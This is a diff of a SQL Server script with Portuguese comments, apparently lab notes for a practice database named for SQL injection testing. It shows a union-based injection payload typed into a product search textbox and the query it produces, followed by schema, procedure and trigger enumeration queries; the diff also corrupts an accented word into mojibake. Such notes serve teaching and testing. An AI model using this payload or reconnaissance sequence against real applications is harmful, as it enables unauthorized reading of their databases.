@@ -66,7 +66,7 @@ RETURN
 --TEXTBOX:
 --	' union SELECT DB_NAME(), 99 --
 --RESULTADO:	
-	SELECT name AS 'Produto', price as 'Preço' from products WHERE name LIKE  '%' union SELECT DB_NAME(), 99 --%'
+	SELECT name AS 'Produto', price as 'PreÃ§o' from products WHERE name LIKE  '%' union SELECT DB_NAME(), 99 --%'
 
 
 select @@VERSION
@@ -98,6 +98,9 @@ SELECT COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS
 SELECT SPECIFIC_CATALOG, ROUTINE_NAME, ROUTINE_DEFINITION  from db_testSqlInjection.information_schema.routines  where routine_type = 'PROCEDURE'
 --ou 
 SELECT * FROM sys.procedures
+
+--buscando triggers
+SELECT  sysobjects.name AS trigger_name, OBJECT_NAME(parent_obj) AS table_name, OBJECT_DEFINITION(id) AS trigger_definition FROM sysobjects WHERE sysobjects.type = 'TR' 
 
 --buscando mais objetos como PKS, tabelas
 SELECT name, type  FROM sys.sysobjects -- WHERE type = 'P'
